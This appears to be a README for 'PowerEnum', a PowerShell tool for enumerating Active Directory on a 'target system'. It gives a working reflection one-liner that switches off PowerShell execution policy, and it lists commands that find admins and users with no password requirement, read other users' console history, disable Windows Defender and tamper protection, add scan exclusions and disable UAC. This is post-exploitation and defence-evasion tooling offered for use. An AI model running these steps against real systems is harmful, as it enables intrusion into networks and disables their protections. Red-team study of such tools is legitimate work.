# PowerEnum
Powershell script for enumerating Active Directory. Nothing new or ground breaking, just a cool project to further develop my knowledge of powershell, Windows and specifically AD.

# Usage

Download the **powerenum.ps1** script and get it onto your target system. This can be done multiple ways which you can figure out for yourself.

Once on the system you will need to import the script to be able to use it.

```posh
Import-Module powerenum.ps1
```

You will likely need to change the execution policy to run this script:

```posh
Set-ExecutionPolicy Bypass
```

If this does not work, you can run the following code to disable execution policy:

```posh
# Create the function
function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}
# Execute the function
Disable-ExecutionPolicy
```

### Commands

##### Domain Information Gathering
```posh
# Retrieve some initial information about the domain including domain info and connected systems
Get-Basics 
# Get-Basics has 3 optional arguments
Get-Basics -IPAddress:$true -DomainInformation:$true -ConnectedSystems:$true
# Find listening ports and the service running on that port
Get-Listening

# Retrieve all the admins in the domain
Get-Admins
# Retrieve all OUs in the domain
Get-OUs
# Retrieve all groups in the domain
Get-AllGroups
# Retrieve all users in the domain
Get-AllUsers

# Retrieve all users who don't require a password
Get-NoPass
# Retrieve console history for a specified user
Get-History
# Disable Windows defender
Disable-Defender
# Add a folder to exclude from defender scans
Add-DefenderExclusion -Path <PATH>
# Disable tamper protection on the system
Disable-TamperProtection
# Disable UAC
Disable-UAC
```
